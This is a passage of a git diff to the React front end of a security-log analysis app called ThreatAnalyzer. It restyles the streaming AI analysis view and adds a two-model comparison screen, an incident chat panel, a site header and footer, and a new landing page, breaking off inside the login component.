-          for (const line of lines) {
-            if (!line.startsWith('data: ')) continue;
-            try {
-              const data = JSON.parse(line.slice(6));
-              if (data.type === 'chunk') {
-                setChunks(t => t + data.text);
-                setTimeout(() => bottomRef.current?.scrollIntoView({ behavior:'smooth' }), 50);
-              }
-              if (data.type === 'done') {
-                setStatus('done');
-                setTimeout(() => onComplete(data.result, data.scanId), 600);
-              }
-              if (data.type === 'error') throw new Error(data.message);
-            } catch (_) {}
+        if (!res.ok) { const e=await res.json(); throw new Error(e.error||'Stream failed'); }
+        const reader=res.body.getReader(); const decoder=new TextDecoder(); let buffer='';
+        while(true){
+          const{done,value}=await reader.read(); if(done)break;
+          buffer+=decoder.decode(value,{stream:true});
+          const lines=buffer.split('\n'); buffer=lines.pop();
+          for(const line of lines){
+            if(!line.startsWith('data: '))continue;
+            try{
+              const data=JSON.parse(line.slice(6));
+              if(data.type==='chunk'){setChunks(t=>t+data.text);bottomRef.current?.scrollIntoView({behavior:'smooth'});}
+              if(data.type==='done'){setStatus('done');setTimeout(()=>onComplete(data.result,data.scanId),600);}
+              if(data.type==='error')throw new Error(data.message);
+            }catch(_){}
           }
         }
-      } catch (err) {
-        onError(err.message || 'Streaming failed. Please try again.');
-      }
+      }catch(err){onError(err.message||'Analysis failed.');}
     })();
   }, []);
 
-  const progress = Math.min(98, Math.round((chunks.length / 1800) * 100));
-
+  const pct = Math.min(98, Math.round(chunks.length/1800*100));
   return (
-    <div className="space-y-4">
-      {/* Status bar */}
-      <div className="flex items-center justify-between mb-1">
-        <div className="flex items-center gap-2">
-          <div className={`w-2 h-2 rounded-full ${status === 'done' ? 'bg-emerald-500' : 'bg-blue-500 animate-pulse'}`} />
-          <span className="text-xs text-slate-400">
-            {status === 'connecting' ? 'Connecting to AI…' : status === 'done' ? 'Analysis complete ✓' : 'AI is analysing your logs…'}
-          </span>
+    <div style={{ padding:'32px 0' }}>
+      <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:8 }}>
+        <div style={{ display:'flex', alignItems:'center', gap:8 }}>
+          <span style={{ width:8, height:8, borderRadius:'50%', background: status==='done' ? COLORS.success : COLORS.primary,
+            display:'inline-block', animation: status!=='done' ? 'pulse 1.2s ease-in-out infinite' : 'none' }} />
+          <span style={{ fontSize:13, color:'#555' }}>{status==='done'?'Analysis complete ✓':'AI is analysing your logs…'}</span>
         </div>
-        <span className="text-xs text-slate-600 font-mono">{chunks.length} chars</span>
+        <span style={{ fontSize:12, color:'#aaa', fontFamily:'monospace' }}>{chunks.length} chars</span>
       </div>
-      <div className="h-0.5 bg-white/5 rounded-full overflow-hidden">
-        <div className="h-full bg-gradient-to-r from-blue-600 to-blue-400 rounded-full transition-all duration-300"
-          style={{ width: status === 'done' ? '100%' : `${progress}%` }} />
+      <div style={{ height:3, background:'#eee', borderRadius:2, marginBottom:16, overflow:'hidden' }}>
+        <div style={{ width: status==='done'?'100%':`${pct}%`, height:'100%', background:COLORS.primary,
+          borderRadius:2, transition:'width 0.4s ease' }} />
       </div>
-
-      {/* Live text terminal */}
-      <div className="bg-[#060810] border border-white/[0.06] rounded-xl overflow-hidden">
-        <div className="flex items-center gap-2 px-4 py-2.5 border-b border-white/[0.04] bg-white/[0.02]">
-          <div className="w-2.5 h-2.5 rounded-full bg-red-500/60" />
-          <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/60" />
-          <div className="w-2.5 h-2.5 rounded-full bg-emerald-500/60" />
-          <span className="text-slate-600 text-xs ml-2 font-mono">llama-3.3-70b — live output</span>
+      <div style={{ background:'#1a1a2e', borderRadius:10, overflow:'hidden' }}>
+        <div style={{ display:'flex', alignItems:'center', gap:6, padding:'8px 14px', background:'rgba(255,255,255,0.04)', borderBottom:'0.5px solid rgba(255,255,255,0.08)' }}>
+          <span style={{ width:10, height:10, borderRadius:'50%', background:'#FF5A5F' }} />
+          <span style={{ width:10, height:10, borderRadius:'50%', background:'#FFBD2E' }} />
+          <span style={{ width:10, height:10, borderRadius:'50%', background:'#27C93F' }} />
+          <span style={{ fontSize:11, color:'rgba(255,255,255,0.35)', marginLeft:8, fontFamily:'monospace' }}>llama-3.3-70b — live output</span>
         </div>
-        <div className="p-4 font-mono text-xs leading-relaxed overflow-y-auto max-h-72 min-h-32">
-          {chunks ? (
-            <>
-              <span className="text-emerald-400/80">{chunks}</span>
-              {status !== 'done' && <span className="text-blue-400 animate-pulse">▋</span>}
-            </>
-          ) : (
-            <span className="text-slate-700">Waiting for AI response<span className="animate-pulse">…</span></span>
-          )}
+        <div style={{ padding:16, fontFamily:'monospace', fontSize:12, lineHeight:1.7, maxHeight:240, overflowY:'auto', minHeight:100 }}>
+          <span style={{ color:'#7EC8A0' }}>{chunks}</span>
+          {status!=='done' && <span style={{ color:COLORS.primary, animation:'blink 1s step-end infinite' }}>▋</span>}
           <div ref={bottomRef} />
         </div>
       </div>
@@ -431,70 +460,439 @@ function StreamingAnalysis({ input, file, onComplete, onError }) {
   );
 }
 
+// Multi-model compare runner
+function CompareRunner({ input, onBack }) {
+  const [status, setStatus] = useState('loading');
+  const [models, setModels] = useState([]);
+  const [error, setError] = useState('');
+
+  useEffect(() => {
+    (async () => {
+      try {
+        const token = await getToken();
+        const res = await fetch(`${API}/api/analyze/compare`, {
+          method:'POST',
+          headers:{ 'Content-Type':'application/json', ...(token?{Authorization:`Bearer ${token}`}:{}) },
+          body: JSON.stringify({ input }),
+        });
+        const reader=res.body.getReader(); const decoder=new TextDecoder(); let buffer='';
+        while(true){
+          const{done,value}=await reader.read(); if(done)break;
+          buffer+=decoder.decode(value,{stream:true});
+          const lines=buffer.split('\n'); buffer=lines.pop();
+          for(const line of lines){
+            if(!line.startsWith('data: '))continue;
+            try{
+              const data=JSON.parse(line.slice(6));
+              if(data.type==='done'){setModels(data.models);setStatus('done');}
+              if(data.type==='error')throw new Error(data.message);
+            }catch(_){}
+          }
+        }
+      }catch(err){setError(err.message);setStatus('error');}
+    })();
+  }, []);
+
+  if(status==='loading') return (
+    <div style={{ padding:'64px 0', textAlign:'center' }}>
+      <div style={{ fontSize:40, marginBottom:16 }}>⚔️</div>
+      <p style={{ fontWeight:500, color:'#1a1a2e', marginBottom:6 }}>Running both models in parallel…</p>
+      <p style={{ fontSize:13, color:'#888' }}>Llama 3.3 70B vs Mixtral 8x7B</p>
+    </div>
+  );
+  if(status==='error') return (
+    <div style={{ padding:24, textAlign:'center' }}>
+      <p style={{ color:COLORS.danger, marginBottom:16 }}>{error}</p>
+      <button onClick={onBack} style={btnOutline}>← Back</button>
+    </div>
+  );
+
+  const [m1,m2]=models;
+  const agree=m1?.result?.severity===m2?.result?.severity;
+  return (
+    <div>
+      <div style={{ padding:'12px 16px', borderRadius:10, marginBottom:20,
+        background: agree ? COLORS.successLt : COLORS.warningLt,
+        border:`0.5px solid ${agree ? COLORS.success : COLORS.warning}44` }}>
+        <p style={{ fontWeight:500, fontSize:13, color: agree ? COLORS.success : COLORS.warning }}>
+          {agree ? '✓ Both models agree on severity' : '⚠ Models disagree on severity — review carefully'}
+        </p>
+        <p style={{ fontSize:12, color:'#666', marginTop:2 }}>
+          Risk score difference: {Math.abs((m1?.result?.riskScore||0)-(m2?.result?.riskScore||0))} points
+        </p>
+      </div>
+
+      <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:16, marginBottom:16 }}>
+        {models.map((model,i) => model.result ? (
+          <div key={i} style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
+            <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:12, paddingBottom:12,
+              borderBottom:`0.5px solid ${COLORS.border}` }}>
+              <div>
+                <span style={{ fontSize:13, fontWeight:500, color: i===0?COLORS.primary:'#7F77DD' }}>{model.label}</span>
+                {i===0 && <span style={{ marginLeft:6, fontSize:10, background:COLORS.primaryLt, color:COLORS.primary,
+                  padding:'1px 6px', borderRadius:99 }}>Primary</span>}
+              </div>
+              <SevBadge level={model.result.severity} />
+            </div>
+            <div style={{ display:'flex', alignItems:'center', gap:16, marginBottom:12 }}>
+              <div style={{ textAlign:'center' }}>
+                <div style={{ fontSize:36, fontWeight:500, color:riskColor(model.result.riskScore||0), lineHeight:1 }}>
+                  {model.result.riskScore}
+                </div>
+                <div style={{ fontSize:11, color:'#aaa' }}>/ 100</div>
+              </div>
+              <div style={{ flex:1 }}>
+                <ConfBar value={model.result.confidence||0} label="Confidence" />
+              </div>
+            </div>
+            <p style={{ fontSize:12, color:'#555', lineHeight:1.6 }}>{model.result.summary}</p>
+          </div>
+        ) : (
+          <div key={i} style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
+            <p style={{ color:COLORS.danger, fontSize:13 }}>{model.error || 'Model failed'}</p>
+          </div>
+        ))}
+      </div>
+
+      {m1?.result && m2?.result && (
+        <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, overflow:'hidden', marginBottom:16 }}>
+          <div style={{ padding:'12px 20px', borderBottom:`0.5px solid ${COLORS.border}` }}>
+            <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e' }}>Side-by-side comparison</p>
+          </div>
+          <table style={{ width:'100%', fontSize:13, borderCollapse:'collapse' }}>
+            <thead>
+              <tr style={{ background:'#F5F7FA' }}>
+                <th style={{ textAlign:'left', padding:'8px 20px', fontSize:11, color:'#888', fontWeight:500, textTransform:'uppercase', letterSpacing:'0.06em' }}>Metric</th>
+                <th style={{ textAlign:'center', padding:'8px 20px', fontSize:12, color:COLORS.primary, fontWeight:500 }}>{m1.label}</th>
+                <th style={{ textAlign:'center', padding:'8px 20px', fontSize:12, color:'#7F77DD', fontWeight:500 }}>{m2.label}</th>
+              </tr>
+            </thead>
+            <tbody>
+              {[['Risk Score',m1.result.riskScore,m2.result.riskScore],['Severity',m1.result.severity,m2.result.severity],
+                ['Confidence',`${m1.result.confidence||0}%`,`${m2.result.confidence||0}%`],
+                ['IOCs',m1.result.iocs?.length||0,m2.result.iocs?.length||0],
+                ['Techniques',m1.result.mitreMapping?.length||0,m2.result.mitreMapping?.length||0],
+                ['Timeline events',m1.result.timeline?.length||0,m2.result.timeline?.length||0]
+              ].map(([label,v1,v2])=>(
+                <tr key={label} style={{ borderTop:`0.5px solid ${COLORS.border}` }}>
+                  <td style={{ padding:'8px 20px', color:'#555' }}>{label}</td>
+                  <td style={{ padding:'8px 20px', textAlign:'center', fontWeight:500, color:String(v1)!==String(v2)?COLORS.primary:'#1a1a2e' }}>{v1}</td>
+                  <td style={{ padding:'8px 20px', textAlign:'center', fontWeight:500, color:String(v1)!==String(v2)?'#7F77DD':'#1a1a2e' }}>{v2}</td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </div>
+      )}
+
+      <button onClick={onBack} style={btnOutline}>← Back</button>
+    </div>
+  );
+}
+
+// AI Chat panel
+function ChatPanel({ scanId }) {
+  const [messages, setMessages] = useState([]);
+  const [input, setInput] = useState('');
+  const [streaming, setStreaming] = useState(false);
+  const [loadingHist, setLoadingHist] = useState(true);
+  const bottomRef = useRef();
+
+  const QUICK = ['How urgent is this threat?','Explain the lateral movement','What should I do first?','Is this an APT attack?'];
+
+  useEffect(() => {
+    if (!scanId) { setLoadingHist(false); return; }
+    apiFetch(`/api/chat/${scanId}`).then(d=>setMessages(d.messages||[])).catch(()=>{}).finally(()=>setLoadingHist(false));
+  }, [scanId]);
+
+  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior:'smooth' }); }, [messages]);
+
+  async function send(q) {
+    const question = q || input.trim();
+    if (!question || streaming) return;
+    setInput(''); setStreaming(true);
+    setMessages(prev => [...prev,
+      { id:Date.now(), role:'user', content:question },
+      { id:Date.now()+1, role:'assistant', content:'', streaming:true }
+    ]);
+    try {
+      const token = await getToken();
+      const res = await fetch(`${API}/api/chat/${scanId}/stream`, {
+        method:'POST',
+        headers:{ 'Content-Type':'application/json', ...(token?{Authorization:`Bearer ${token}`}:{}) },
+        body: JSON.stringify({ question }),
+      });
+      const reader=res.body.getReader(); const decoder=new TextDecoder(); let buffer='', answer='';
+      while(true){
+        const{done,value}=await reader.read(); if(done)break;
+        buffer+=decoder.decode(value,{stream:true});
+        const lines=buffer.split('\n'); buffer=lines.pop();
+        for(const line of lines){
+          if(!line.startsWith('data: '))continue;
+          try{
+            const data=JSON.parse(line.slice(6));
+            if(data.type==='chunk'){answer+=data.text;setMessages(prev=>prev.map((m,i)=>i===prev.length-1?{...m,content:answer}:m));}
+            if(data.type==='done'){setMessages(prev=>prev.map((m,i)=>i===prev.length-1?{...m,streaming:false}:m));}
+          }catch(_){}
+        }
+      }
+    }catch(err){setMessages(prev=>prev.map((m,i)=>i===prev.length-1?{...m,content:'Something went wrong. Please try again.',streaming:false}:m));}
+    setStreaming(false);
+  }
+
+  return (
+    <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, display:'flex', flexDirection:'column', height:520 }}>
+      <div style={{ padding:'16px 20px', borderBottom:`0.5px solid ${COLORS.border}`, display:'flex', alignItems:'center', gap:12 }}>
+        <div style={{ width:32, height:32, borderRadius:8, background:COLORS.primaryLt, display:'flex', alignItems:'center', justifyContent:'center', fontSize:16 }}>🤖</div>
+        <div style={{ flex:1 }}>
+          <p style={{ fontWeight:500, fontSize:13, color:'#1a1a2e', marginBottom:1 }}>AI threat analyst</p>
+          <p style={{ fontSize:12, color:'#888' }}>Ask anything about this incident</p>
+        </div>
+        <span style={{ width:8, height:8, borderRadius:'50%', background: streaming ? COLORS.primary : COLORS.success }} />
+      </div>
+      <div style={{ flex:1, overflowY:'auto', padding:16, display:'flex', flexDirection:'column', gap:12 }}>
+        {loadingHist ? <p style={{ fontSize:13, color:'#aaa', textAlign:'center', marginTop:16 }}>Loading history…</p>
+        : messages.length===0 ? (
+          <div style={{ textAlign:'center', paddingTop:24 }}>
+            <p style={{ fontSize:14, fontWeight:500, color:'#1a1a2e', marginBottom:6 }}>Ask me anything about this incident</p>
+            <p style={{ fontSize:13, color:'#888', marginBottom:20 }}>I have full context of all findings, IOCs, and techniques</p>
+            <div style={{ display:'flex', flexWrap:'wrap', gap:8, justifyContent:'center' }}>
+              {QUICK.map(q => (
+                <button key={q} onClick={() => send(q)}
+                  style={{ padding:'6px 14px', borderRadius:99, fontSize:12, cursor:'pointer',
+                    background:COLORS.primaryLt, border:`0.5px solid ${COLORS.primary}44`, color:COLORS.primary }}>
+                  {q}
+                </button>
+              ))}
+            </div>
+          </div>
+        ) : (
+          <>
+            {messages.map((msg,i)=>(
+              <div key={msg.id||i} style={{ display:'flex', gap:10, flexDirection:msg.role==='user'?'row-reverse':'row' }}>
+                <div style={{ width:28, height:28, borderRadius:'50%', flexShrink:0, display:'flex', alignItems:'center', justifyContent:'center', fontSize:12, fontWeight:500,
+                  background: msg.role==='user' ? COLORS.primaryLt : COLORS.successLt,
+                  color: msg.role==='user' ? COLORS.primary : COLORS.success, border:`0.5px solid ${msg.role==='user'?COLORS.primary:COLORS.success}33` }}>
+                  {msg.role==='user'?'U':'AI'}
+                </div>
+                <div style={{ maxWidth:'78%', padding:'10px 14px', borderRadius:10, fontSize:13, lineHeight:1.6,
+                  background: msg.role==='user' ? COLORS.primaryLt : '#F5F7FA',
+                  border:`0.5px solid ${msg.role==='user'?COLORS.primary+'33':COLORS.border}`,
+                  color: '#1a1a2e',
+                  borderTopRightRadius: msg.role==='user' ? 2 : 10,
+                  borderTopLeftRadius: msg.role==='user' ? 10 : 2 }}>
+                  {msg.content || (msg.streaming && <span style={{ color:'#aaa' }}>Thinking…</span>)}
+                  {msg.streaming && msg.content && <span style={{ color:COLORS.primary, marginLeft:2 }}>▋</span>}
+                </div>
+              </div>
+            ))}
+            {!streaming && messages.length>0 && (
+              <div style={{ display:'flex', flexWrap:'wrap', gap:6, paddingTop:4 }}>
+                {QUICK.slice(0,3).map(q=>(
+                  <button key={q} onClick={()=>send(q)}
+                    style={{ padding:'4px 10px', borderRadius:99, fontSize:11, cursor:'pointer',
+                      background:'transparent', border:`0.5px solid ${COLORS.border}`, color:'#888',
+                      transition:'all 0.15s' }}>
+                    {q}
+                  </button>
+                ))}
+              </div>
+            )}
+            <div ref={bottomRef} />
+          </>
+        )}
+      </div>
+      <div style={{ padding:'12px 16px', borderTop:`0.5px solid ${COLORS.border}`, display:'flex', gap:8 }}>
+        <input value={input} onChange={e=>setInput(e.target.value)}
+          onKeyDown={e=>{ if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();send();}}}
+          disabled={streaming}
+          style={{ flex:1, padding:'8px 14px', borderRadius:8, border:`0.5px solid ${COLORS.border}`,
+            fontSize:13, outline:'none', color:'#1a1a2e', background:'#fff',
+            opacity: streaming ? 0.6 : 1 }}
+          placeholder="Ask about this incident… (Enter to send)" />
+        <button onClick={()=>send()} disabled={!input.trim()||streaming}
+          style={{ ...btnPrimary, padding:'8px 16px', fontSize:13, opacity: (!input.trim()||streaming)?0.5:1 }}>
+          {streaming ? '…' : '→'}
+        </button>
+      </div>
+    </div>
+  );
+}
+
+// ── Button styles ─────────────────────────────────────────────
+const btnPrimary = {
+  background: COLORS.primary, color:'#fff', border:'none',
+  padding:'10px 24px', borderRadius:8, fontSize:14, fontWeight:500, cursor:'pointer',
+};
+const btnOutline = {
+  background: 'transparent', color:'#1a1a2e', border:`0.5px solid ${COLORS.border}`,
+  padding:'10px 24px', borderRadius:8, fontSize:14, cursor:'pointer',
+};
+const btnSecondary = {
+  background: '#F5F7FA', color:'#555', border:`0.5px solid ${COLORS.border}`,
+  padding:'10px 24px', borderRadius:8, fontSize:14, cursor:'pointer',
+};
+
+// ══════════════════════════════════════════════════════════════
+// SITE HEADER
+// ══════════════════════════════════════════════════════════════
+function Header({ user, onNewScan, onAccount, onHome }) {
+  return (
+    <header style={{ background:'#fff', borderBottom:`0.5px solid ${COLORS.border}`, position:'sticky', top:0, zIndex:100 }}>
+      <div style={{ maxWidth:960, margin:'0 auto', padding:'0 24px', height:56, display:'flex', alignItems:'center', justifyContent:'space-between' }}>
+        <button onClick={onHome} style={{ display:'flex', alignItems:'center', gap:10, background:'none', border:'none', cursor:'pointer', padding:0 }}>
+          <ShieldLogo size={28} />
+          <span style={{ fontSize:15, fontWeight:500, color:'#1a1a2e' }}>ThreatAnalyzer</span>
+        </button>
+        <div style={{ display:'flex', alignItems:'center', gap:24 }}>
+          {user ? (
+            <>
+              <button onClick={onAccount} style={{ fontSize:14, color:'#555', background:'none', border:'none', cursor:'pointer' }}>Account</button>
+              <button onClick={onNewScan} style={{ ...btnPrimary, display:'flex', alignItems:'center', gap:6, padding:'8px 18px', fontSize:14 }}>
+                <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
+                  <path d="M8 2v9M4 7l4 4 4-4M2 13h12" stroke="#fff" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
+                </svg>
+                Upload file
+              </button>
+            </>
+          ) : (
+            <>
+              <a href="#" style={{ fontSize:14, color:'#555', textDecoration:'none' }}>Home</a>
+              <a href="#" style={{ fontSize:14, color:'#555', textDecoration:'none' }}>Docs</a>
+              <a href="#" style={{ fontSize:14, color:'#555', textDecoration:'none' }}>Pricing</a>
+            </>
+          )}
+        </div>
+      </div>
+    </header>
+  );
+}
+
+// ══════════════════════════════════════════════════════════════
+// SITE FOOTER
+// ══════════════════════════════════════════════════════════════
+function Footer() {
+  return (
+    <footer style={{ background:COLORS.footer, padding:'32px 0', marginTop:'auto' }}>
+      <div style={{ maxWidth:960, margin:'0 auto', padding:'0 24px', display:'flex', alignItems:'center', justifyContent:'space-between', flexWrap:'wrap', gap:16 }}>
+        <div style={{ display:'flex', alignItems:'center', gap:8 }}>
+          <svg width="20" height="20" viewBox="0 0 28 28" fill="none">
+            <path d="M14 3L4 7v8c0 5.5 4.3 10.7 10 12 5.7-1.3 10-6.5 10-12V7L14 3z" fill="#185FA5" fillOpacity="0.4" stroke="#85B7EB" strokeWidth="1.5" />
+            <path d="M10 14l3 3 5-5" stroke="#85B7EB" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
+          </svg>
+          <span style={{ fontSize:13, color:'#B5D4F4' }}>ThreatAnalyzer</span>
+        </div>
+        <div style={{ display:'flex', gap:24 }}>
+          {['Privacy','Terms','Contact'].map(l => (
+            <a key={l} href="#" style={{ fontSize:13, color:'#B5D4F4', textDecoration:'none' }}>{l}</a>
+          ))}
+        </div>
+        <span style={{ fontSize:12, color:'#378ADD' }}>© {new Date().getFullYear()} ThreatAnalyzer. All rights reserved.</span>
+      </div>
+    </footer>
+  );
+}
+
+// Wrap pages
+function Page({ children }) {
+  return (
+    <div style={{ minHeight:'100vh', display:'flex', flexDirection:'column', background:'#F5F7FA' }}>
+      {children}
+      <Footer />
+    </div>
+  );
+}
+function Container({ children, style={} }) {
+  return <div style={{ maxWidth:960, margin:'0 auto', padding:'0 24px', ...style }}>{children}</div>;
+}
+
 // ══════════════════════════════════════════════════════════════
 // LANDING
 // ══════════════════════════════════════════════════════════════
 function Landing({ onLogin, onSignup }) {
   return (
-    <div className="min-h-screen bg-[#080a0e] text-white">
-      <header className="border-b border-white/[0.06] h-14 flex items-center px-6">
-        <div className="max-w-5xl mx-auto w-full flex items-center justify-between">
-          <div className="flex items-center gap-2">
-            <div className="w-7 h-7 rounded-lg bg-blue-600 flex items-center justify-center">🛡</div>
-            <span className="font-bold">ThreatAnalyzer</span>
-            <span className="text-[10px] font-mono text-blue-400 bg-blue-500/10 border border-blue-500/20 px-1.5 py-0.5 rounded ml-1">AI</span>
-          </div>
-          <div className="flex items-center gap-2">
-            <button onClick={onLogin} className="px-4 py-1.5 text-slate-400 hover:text-white text-sm transition-colors">Sign In</button>
-            <button onClick={onSignup} className="px-4 py-1.5 bg-blue-600 hover:bg-blue-500 text-white text-sm font-medium rounded-lg transition-colors">Get Started</button>
-          </div>
-        </div>
-      </header>
+    <Page>
+      <Header user={null} onHome={()=>{}} />
 
-      <div className="max-w-5xl mx-auto px-6">
-        <div className="pt-20 pb-16 text-center">
-          <div className="inline-flex items-center gap-2 bg-blue-500/10 border border-blue-500/20 rounded-full px-4 py-1.5 text-blue-400 text-xs font-medium mb-8">
-            <span className="w-1.5 h-1.5 rounded-full bg-blue-400 animate-pulse" />
-            MITRE ATT&CK v14 · Live AI Streaming · Free & Unlimited
-          </div>
-          <h1 className="text-5xl md:text-6xl font-black leading-tight mb-6">
-            Instant Threat<br />
-            <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-blue-600">Intelligence</span>
-          </h1>
-          <p className="text-slate-400 text-lg max-w-xl mx-auto mb-10 leading-relaxed">
-            Paste any security log and watch the AI analyse it live. Get ATT&CK mapping, IOCs, risk scoring, charts, and PDF reports — in seconds.
-          </p>
-          <div className="flex items-center justify-center gap-3 flex-wrap">
-            <button onClick={onSignup} className="px-7 py-3 bg-blue-600 hover:bg-blue-500 text-white font-semibold rounded-xl transition-all hover:scale-105 shadow-lg shadow-blue-600/20">
-              Start Analysing Free →
-            </button>
-            <button onClick={onLogin} className="px-7 py-3 bg-white/5 hover:bg-white/10 border border-white/10 text-white font-medium rounded-xl transition-colors">
-              Sign In
-            </button>
-          </div>
-        </div>
-
-        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 pb-8">
-          {[['🔴','Live Streaming','Watch AI analyse in real-time'],['📊','Charts & Trends','Visualise your threat history'],['📄','PDF Export','Download professional reports'],['🔗','Share Links','Share reports with your team']].map(([icon,title,desc]) => (
-            <div key={title} className="bg-[#0f1117] border border-white/[0.06] rounded-2xl p-5 hover:border-white/10 transition-colors">
-              <div className="text-xl mb-2">{icon}</div>
-              <div className="font-semibold text-sm mb-1">{title}</div>
-              <div className="text-slate-500 text-xs leading-relaxed">{desc}</div>
+      {/* Hero */}
+      <div style={{ background:'#fff', padding:'64px 0 56px', position:'relative', overflow:'hidden' }}>
+        <NetworkBg />
+        <Container>
+          <div style={{ maxWidth:560, position:'relative', zIndex:1 }}>
+            <div style={{ display:'inline-flex', alignItems:'center', gap:6, fontSize:11, fontWeight:500,
+              padding:'3px 10px', borderRadius:99, background:COLORS.dangerLt, color:COLORS.danger, marginBottom:16 }}>
+              <span style={{ width:6, height:6, borderRadius:'50%', background:COLORS.danger }} />
+              AI-powered threat detection
             </div>
-          ))}
-        </div>
-
-        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 pb-20">
-          {[['🗺️','MITRE ATT&CK','200+ techniques mapped'],['🎯','IOC Extraction','IPs, domains, hashes'],['🏷️','Tag & Label','Organise your scans'],['🔍','Search & Filter','Find past incidents']].map(([icon,title,desc]) => (
-            <div key={title} className="bg-[#0f1117] border border-white/[0.06] rounded-2xl p-5 hover:border-white/10 transition-colors">
-              <div className="text-xl mb-2">{icon}</div>
-              <div className="font-semibold text-sm mb-1">{title}</div>
-              <div className="text-slate-500 text-xs leading-relaxed">{desc}</div>
+            <h1 style={{ fontSize:36, fontWeight:500, lineHeight:1.2, marginBottom:16, color:'#1a1a2e' }}>
+              Detect AI-generated threats instantly
+            </h1>
+            <p style={{ fontSize:16, color:'#666', lineHeight:1.7, marginBottom:32 }}>
+              Upload a file or paste text to get a detailed risk analysis with MITRE ATT&CK mapping, IOC extraction, and actionable remediation steps.
+            </p>
+            <div style={{ display:'flex', gap:12, alignItems:'center', flexWrap:'wrap' }}>
+              <button onClick={onSignup} style={btnPrimary}>Analyze now</button>
+              <button onClick={onLogin} style={btnOutline}>Learn more</button>
             </div>
-          ))}
-        </div>
+            <p style={{ fontSize:12, color:'#aaa', marginTop:12 }}>No credit card · Unlimited scans · Results in under 30s</p>
+          </div>
+        </Container>
       </div>
-    </div>
+
+      {/* Form preview */}
+      <Container style={{ padding:'40px 24px' }}>
+        <div style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:24 }}>
+          <div style={{ display:'flex', gap:12, alignItems:'flex-start' }}>
+            <div style={{ flex:1 }}>
+              <textarea style={{ width:'100%', height:120, resize:'vertical', fontSize:14, padding:14,
+                border:`0.5px solid ${COLORS.border}`, borderRadius:8, fontFamily:'inherit',
+                color:'#1a1a2e', background:'#fff', outline:'none', lineHeight:1.6, boxSizing:'border-box' }}
+                placeholder="Paste your text or drag-drop a file…" />
+              <div style={{ display:'flex', gap:8, marginTop:8, alignItems:'center' }}>
+                <svg width="12" height="12" viewBox="0 0 16 16" fill="none">
+                  <path d="M14 10v3H2v-3M8 2v8M5 5l3-3 3 3" stroke="#aaa" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
+                </svg>
+                <span style={{ fontSize:12, color:'#aaa' }}>Supports .txt, .log, .json, .csv — max 5 MB</span>
+              </div>
+            </div>
+            <button onClick={onSignup} style={{ ...btnSecondary, display:'flex', alignItems:'center', gap:6, whiteSpace:'nowrap', flexShrink:0 }}>
+              <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
+                <path d="M14 10v3H2v-3M8 2v8M5 5l3-3 3 3" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
+              </svg>
+              Upload file
+            </button>
+          </div>
+          <div style={{ marginTop:16, display:'flex', justifyContent:'flex-end' }}>
+            <button onClick={onSignup} style={{ ...btnPrimary, display:'flex', alignItems:'center', gap:8 }}>
+              <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
+                <circle cx="8" cy="8" r="6" stroke="#fff" strokeWidth="1.5" />
+                <path d="M5 8l2 2 4-4" stroke="#fff" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
+              </svg>
+              Start analysis
+            </button>
+          </div>
+        </div>
+      </Container>
+
+      {/* Features */}
+      <Container style={{ padding:'0 24px 64px' }}>
+        <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fit,minmax(200px,1fr))', gap:12 }}>
+          {[['🤖','AI threat chat','Ask follow-up questions in natural language'],
+            ['⚔️','Model compare','Run 2 AI models side by side'],
+            ['📊','Confidence scores','Every IOC has its own confidence %'],
+            ['🔁','Pattern matching','Flags IOCs seen in previous scans'],
+            ['📄','PDF export','Download professional reports'],
+            ['🔗','Share links','Share read-only links with your team'],
+          ].map(([icon,title,desc])=>(
+            <div key={title} style={{ background:'#fff', border:`0.5px solid ${COLORS.border}`, borderRadius:12, padding:20 }}>
+              <div style={{ fontSize:22, marginBottom:10 }}>{icon}</div>
+              <div style={{ fontSize:14, fontWeight:500, color:'#1a1a2e', marginBottom:4 }}>{title}</div>
+              <div style={{ fontSize:13, color:'#888', lineHeight:1.5 }}>{desc}</div>
+            </div>
+          ))}
+        </div>
+      </Container>
+    </Page>
   );
 }
 
@@ -502,54 +900,63 @@ function Landing({ onLogin, onSignup }) {
 // AUTH
 // ══════════════════════════════════════════════════════════════
 function Auth({ mode, onSuccess, onSwitch }) {
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
-  const [loading, setLoading] = useState(false);
-  const [msg, setMsg] = useState('');
-  const [isErr, setIsErr] = useState(false);
-
-  async function submit(e) {
-    e.preventDefault(); setLoading(true); setMsg('');
-    try {
-      const res = mode === 'login'
-        ? await supabase.auth.signInWithPassword({ email, password })
-        : await supabase.auth.signUp({ email, password });
-      if (res.error) throw res.error;
-      if (mode === 'signup' && !res.data.session) { setIsErr(false); setMsg('Check your email to confirm, then sign in.'); return; }
+  const [email,setEmail]=useState('');const[pw,setPw]=useState('');
+  const [loading,setLoading]=useState(false);const[msg,setMsg]=useState('');const[isErr,setIsErr]=useState(false);
+  async function submit(e){
+    e.preventDefault();setLoading(true);setMsg('');
+    try{
+      const res=mode==='login'?await supabase.auth.signInWithPassword({email,password:pw}):await supabase.auth.signUp({email,password:pw});
+      if(res.error)throw res.error;
